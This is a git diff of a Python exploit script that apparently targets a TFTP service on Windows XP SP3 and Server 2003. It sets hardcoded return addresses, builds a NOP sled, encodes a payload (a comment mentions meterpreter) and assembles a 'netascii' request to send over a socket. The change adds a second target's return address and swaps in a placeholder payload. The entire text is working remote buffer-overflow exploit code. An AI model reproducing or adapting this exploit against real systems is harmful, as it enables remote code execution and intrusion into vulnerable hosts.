@@ -28,6 +28,7 @@ lhostHex = binascii.a2b_hex(lhostSplit[0]) + binascii.a2b_hex(lhostSplit[1]) +bi
 exploit = ""
 
 ret = "\x53\x93\x42\x7e" # return address for XPSP3, little endian
+ret = "\xd3\xfe\x86\x7c" # return address for 2003, little endian
 nop = "\x90" * (25-len(lhost)) # calc NOP sled size
 
 ## need small payload (<210) but unlike writeup, not a meterpreter shell.  Let's do meterpreter first to validate
@@ -105,7 +106,7 @@ while x < len(encodedPL)-1:
         epl += binascii.a2b_hex(encodedPL[x] +encodedPL[x+1])
         #epl += '\\x' + encodedPL[x] +encodedPL[x+1]
         x = x+2
-
+epl = 206 *'\x90' + 'AAAA'
 exploit = "\x00\x02" + nop + epl + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 #print exploit
 ## create socket and send
